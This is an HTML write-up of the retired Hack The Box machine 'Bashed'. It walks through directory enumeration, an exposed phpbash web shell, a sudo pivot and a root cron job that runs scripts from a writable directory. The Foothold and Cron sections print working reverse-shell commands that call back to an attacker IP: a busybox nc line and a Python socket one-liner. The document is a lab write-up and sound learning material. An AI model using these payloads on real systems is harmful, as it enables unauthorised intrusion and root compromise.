@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bashed &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Bashed</h1>
+    <div class="meta">Target: <code>10.10.14.143</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Gobuster</span><span class="tag">phpbash</span><span class="tag">busybox</span><span class="tag">sudo</span><span class="tag">cron</span><span class="tag">python</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#phpbash-reverse-shell">phpbash → Reverse Shell</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#sudo-to-scriptmanager">sudo to scriptmanager</a><a class="lvl3" href="#cron-writable-scripts-directory">Cron + Writable Scripts Directory</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Bashed is an easy Linux box whose name is a pun: the foothold is <strong>phpbash</strong>, a browser-based semi-interactive web shell that the developer left sitting in a public directory. From <code>www-data</code>, a generous <code>sudo</code> rule pivots to the <code>scriptmanager</code> user, and a <code>cron</code> job running every Python script in a writable directory hands over root. It's a clean lesson in directory enumeration and chaining small misconfigurations.</p>
+<h2 id="recon">Recon</h2>
+<p>A directory brute force with a <code>.php</code> extension surfaced the interesting paths:</p>
+<pre><code class="language-sh">gobuster dir -u http://10.129.219.96/ -w .../big.txt -x php
+/dev                  (Status: 301)
+/php                  (Status: 301)
+/uploads              (Status: 301)
+/config.php           (Status: 200) [Size: 0]
+</code></pre>
+<p>The landing page mentions the developer was building <strong>phpbash</strong>, and <code>/dev/</code> turned out to hold <code>phpbash.php</code> itself.</p>
+<blockquote>
+<p><strong>Screenshot would help here:</strong> phpbash renders as a fake terminal in the browser, a single page where you type commands and see output inline. A screenshot of that interface makes the foothold immediately obvious in a way the URL alone doesn't.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="phpbash-reverse-shell">phpbash → Reverse Shell</h3>
+<p>Opening <code>/dev/phpbash.php</code> drops you straight into a command-execution interface running as <code>www-data</code>. Most reverse-shell payloads died in the restricted environment, but <code>busybox nc</code> worked:</p>
+<pre><code class="language-sh">busybox nc 10.10.14.143 443 -e /bin/bash
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+whoami
+www-data
+</code></pre>
+<p>After upgrading to a PTY with Python, I checked <code>sudo</code> rights:</p>
+<pre><code class="language-sh">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-to-scriptmanager">sudo to scriptmanager</h3>
+<pre><code class="language-sh">sudo -l
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+</code></pre>
+<blockquote>
+<p><strong>Reading a sudo rule:</strong> the <code>(scriptmanager : scriptmanager)</code> part means <code>www-data</code> can run <em>anything</em> as the <code>scriptmanager</code> user/group without a password. That's not root, but it's a lateral move, and <code>scriptmanager</code> can reach files <code>www-data</code> couldn't.</p>
+</blockquote>
+<pre><code class="language-sh">sudo -u scriptmanager /bin/bash
+</code></pre>
+<h3 id="cron-writable-scripts-directory">Cron + Writable Scripts Directory</h3>
+<p>Running <code>pspy</code> to watch processes, I spotted a <code>test.py</code> executing on a schedule. The <code>/scripts</code> directory, previously off-limits, was owned by <code>scriptmanager</code> and contained a <code>.py</code> file plus a <code>.txt</code> it regenerates. Deleting the <code>.txt</code> saw it recreated minutes later, confirming a <code>cron</code> job runs the scripts on a timer. The cron invokes <code>python</code> itself, so <strong>every <code>.py</code> in that directory runs as root on each tick</strong>.</p>
+<blockquote>
+<p><strong>The pattern:</strong> a privileged cron job + a directory you can write to = arbitrary code as the cron's owner. You don't need to know the exact crontab line; the regenerated file proves the schedule, and write access does the rest.</p>
+</blockquote>
+<p>I dropped a Python reverse shell into the scripts directory and waited for cron:</p>
+<pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.143&quot;,31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Cron fired and the shell landed as root:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 31337
+# whoami
+root
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Enumerate with extensions.</strong> <code>-x php</code> is what surfaced <code>phpbash.php</code>; the dev directory was the whole game.</li>
+<li><strong>Read sudo rules carefully</strong>, a non-root target user is still a useful pivot.</li>
+<li><strong>Writable + scheduled = root.</strong> A cron job running scripts from a directory you control is one of the most common Linux privescs. <code>pspy</code> reveals the schedule without needing to read root's crontab.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
